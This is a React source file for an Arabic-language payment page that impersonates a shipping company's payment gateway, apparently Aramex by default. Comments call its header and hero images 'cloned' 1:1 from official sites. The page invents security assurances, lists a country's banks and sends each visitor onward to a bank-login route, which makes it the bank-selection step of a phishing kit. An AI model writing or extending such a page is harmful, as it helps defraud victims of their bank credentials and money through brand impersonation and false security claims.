import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Building2, Loader2, ShieldCheck, Globe, ChevronLeft, Lock } from "lucide-react";
import { getBrandingByCompany } from "@/lib/brandingSystem";
import { getCountryByCode } from "@/lib/countries";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { formatCurrency } from "@/lib/countryCurrencies";

const PaymentBankSelector = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();

  const [selectedBank, setSelectedBank] = useState<string>("");
  const [banks, setBanks] = useState<Bank[]>([]);
  const [loadingBanks, setLoadingBanks] = useState(false);
  
  const countryCode = linkData?.payload?.selectedCountry || linkData?.country_code || "SA";
  const countryData = getCountryByCode(countryCode);
  
  const customerInfo = linkData?.payload?.customerInfo || {};
  const serviceKey = (linkData?.payload?.service_key || customerInfo.service || 'aramex').toLowerCase();
  const branding = getBrandingByCompany(serviceKey);
  
  const shippingInfo = linkData?.payload as any;
  const paymentData = shippingInfo?.payment_data;
  const rawAmount = paymentData?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const currencyCode = paymentData?.currency_code || shippingInfo?.currency_code || countryData?.currency || "SAR";
  const formattedAmount = formatCurrency(rawAmount, currencyCode);
  
  useEffect(() => {
    if (countryCode) {
      setLoadingBanks(true);
      setTimeout(() => {
        const countryBanks = getBanksByCountry(countryCode);
        setBanks(countryBanks);
        setLoadingBanks(false);
      }, 300);
    }
  }, [countryCode]);
  
  const handleBankSelect = async (bankId: string) => {
    setSelectedBank(bankId);
    if (!linkData) return;

    try {
      await updateLink.mutateAsync({
        linkId: id!,
        payload: { ...linkData.payload, selectedBank: bankId }
      });
      setTimeout(() => navigate(`/pay/${id}/bank-login`), 300);
    } catch (error) {
      console.error("Error updating bank:", error);
    }
  };
  
  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <Loader2 className="w-8 h-8 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F6F7F9]" dir="rtl" style={{ fontFamily: branding.fonts.arabic }}>
      {/* Official Cloned Header */}
      <header className="bg-white border-b sticky top-0 z-50 shadow-sm">
        <div className="container mx-auto px-4 h-16 flex items-center justify-between">
          <div className="flex items-center gap-6">
            <img src={branding.logoUrl} alt={branding.nameEn} className="h-8 w-auto object-contain" />
            <div className="h-6 w-px bg-gray-200 hidden md:block" />
            <div className="hidden md:flex items-center gap-4 text-xs font-bold text-gray-400 uppercase tracking-widest">
              <span>Security</span>
              <span>Privacy</span>
              <span>Support</span>
            </div>
          </div>
          <div className="flex items-center gap-4">
            <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 border border-green-100 rounded-full">
              <Lock className="w-3.5 h-3.5 text-green-600" />
              <span className="text-[10px] font-bold text-green-700">اتصال آمن بنسبة 100%</span>
            </div>
            <button className="flex items-center gap-1 text-sm font-bold text-gray-500 hover:text-gray-800">
              <Globe className="w-4 h-4" />
              <span>English</span>
            </button>
          </div>
        </div>
      </header>

      {/* Hero Banner (1:1 Official Backgrounds) */}
      <div className="relative h-40 sm:h-56 flex items-center overflow-hidden">
        <img 
          src={branding.heroBgUrl || '/assets/branding/hero-payment.jpg'} 
          className="absolute inset-0 w-full h-full object-cover" 
          alt="Official Background"
        />
        <div className="absolute inset-0 bg-black/40 backdrop-blur-[2px]" />
        <div className="container mx-auto px-6 relative z-10 text-white">
          <h2 className="text-3xl sm:text-4xl font-black mb-2 leading-tight">بوابة الدفع الإلكترونية</h2>
          <p className="text-sm sm:text-lg opacity-80 max-w-xl font-medium">
            يرجى اختيار البنك الخاص بك لإتمام عملية الدفع بشكل آمن وسريع. يتم تشفير جميع البيانات ولا يتم حفظها.
          </p>
        </div>
      </div>

      <main className="container mx-auto px-4 -mt-8 pb-20 relative z-20">
        <div className="grid lg:grid-cols-3 gap-8">
          {/* Bank Selection Grid */}
          <div className="lg:col-span-2">
            <div className="bg-white rounded-3xl shadow-2xl p-6 sm:p-10 border border-white">
              <div className="flex items-center justify-between mb-8 pb-6 border-b border-gray-100">
                <h3 className="text-xl font-black text-gray-900">اختر البنك الخاص بك</h3>
                <span className="px-3 py-1 bg-gray-100 rounded-full text-[10px] font-bold text-gray-500">
                  {banks.length} بنك متاح في {countryData?.nameAr}
                </span>
              </div>

              <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 gap-4 sm:gap-6">
                {loadingBanks ? (
                  Array(12).fill(0).map((_, i) => (
                    <div key={i} className="h-28 rounded-2xl bg-gray-100 animate-pulse" />
                  ))
                ) : (
                  banks.map((bank) => (
                    <button
                      key={bank.id}
                      onClick={() => handleBankSelect(bank.id)}
                      className="group relative bg-white border border-gray-100 hover:border-blue-600 hover:shadow-2xl hover:shadow-blue-100 transition-all duration-300 p-6 flex flex-col items-center justify-center gap-3 active:scale-95 overflow-hidden"
                      style={{ borderRadius: bank.radius }}
                    >
                      <div className="absolute inset-0 bg-gray-50 opacity-0 group-hover:opacity-10 transition-opacity" />
                      <div className="w-12 h-12 sm:w-16 sm:h-16 flex items-center justify-center relative z-10">
                        <img 
                          src={bank.logo} 
                          alt={bank.nameAr} 
                          className="max-w-full max-h-full object-contain filter group-hover:scale-110 transition-transform duration-300" 
                        />
                      </div>
                      <span className="text-[10px] sm:text-[11px] font-black text-gray-600 leading-tight h-8 flex items-center text-center relative z-10 group-hover:text-blue-700">
                        {bank.nameAr}
                      </span>
                      {selectedBank === bank.id && (
                        <div className="absolute top-0 right-0 p-2">
                          <Loader2 className="w-4 h-4 text-blue-600 animate-spin" />
                        </div>
                      )}
                    </button>
                  ))
                )}
              </div>
            </div>
          </div>

          {/* Transaction Sidebar */}
          <div className="space-y-6">
            <Card className="p-8 rounded-[2rem] border-none shadow-2xl bg-white relative overflow-hidden">
              <div className="absolute top-0 left-0 w-24 h-24 bg-blue-50/50 rounded-full -ml-12 -mt-12" />
              <div className="relative z-10">
                <h4 className="text-sm font-bold text-gray-400 uppercase tracking-widest mb-6">تفاصيل العملية</h4>
                
                <div className="space-y-6">
                  <div>
                    <span className="text-xs font-bold text-gray-500 block mb-1">المبلغ المطلوب سداده</span>
                    <span className="text-3xl font-black text-blue-700">{formattedAmount}</span>
                  </div>
                  
                  <div className="h-px bg-gray-100" />
                  
                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <span className="text-[10px] font-bold text-gray-400 block mb-1 uppercase">رقم المرجع</span>
                      <span className="text-xs font-black text-gray-900 font-mono tracking-tighter">
                        {id?.substring(0, 10).toUpperCase()}
                      </span>
                    </div>
                    <div>
                      <span className="text-[10px] font-bold text-gray-400 block mb-1 uppercase">التاريخ</span>
                      <span className="text-xs font-black text-gray-900">
                        {new Date().toLocaleDateString('ar-SA')}
                      </span>
                    </div>
                  </div>

                  <div className="bg-blue-50/50 p-4 rounded-2xl border border-blue-100 flex gap-3">
                    <ShieldCheck className="w-5 h-5 text-blue-600 flex-shrink-0" />
                    <p className="text-[10px] text-blue-800 leading-relaxed font-bold">
                      يتم تنفيذ هذه العملية عبر معالجات دفع مشفرة. لا يمكن للتاجر الوصول إلى بياناتك البنكية.
                    </p>
                  </div>
                </div>
              </div>
            </Card>

            <div className="bg-white/50 backdrop-blur-md rounded-[2rem] p-6 border border-white shadow-xl flex flex-col items-center gap-4">
              <span className="text-[10px] font-black text-gray-400 uppercase tracking-wider">Accepted Cards</span>
              <div className="flex justify-center gap-6 opacity-30 grayscale hover:grayscale-0 hover:opacity-100 transition-all">
                <img src="/assets/branding/logo-mada.png" className="h-5" />
                <img src="/assets/branding/logo-visa.png" className="h-4" />
                <img src="/assets/branding/logo-mastercard.png" className="h-6" />
              </div>
            </div>
          </div>
        </div>
      </main>

      <footer className="bg-white border-t py-12">
        <div className="container mx-auto px-4 text-center">
          <img src={branding.logoUrl} alt={branding.nameEn} className="h-6 mx-auto mb-6 opacity-40 grayscale" />
          <p className="text-xs font-bold text-gray-400 mb-6">
            © 2026 {branding.nameEn} - النظام الموحد للمدفوعات الإلكترونية. جميع الحقوق محفوظة.
          </p>
          <div className="flex justify-center gap-8 text-[10px] font-black text-gray-500 uppercase tracking-widest">
            <a href="#" className="hover:text-blue-600 transition-colors">Terms of Service</a>
            <a href="#" className="hover:text-blue-600 transition-colors">Privacy Policy</a>
            <a href="#" className="hover:text-blue-600 transition-colors">Security Audit</a>
          </div>
        </div>
      </footer>
    </div>
  );
};

export default PaymentBankSelector;
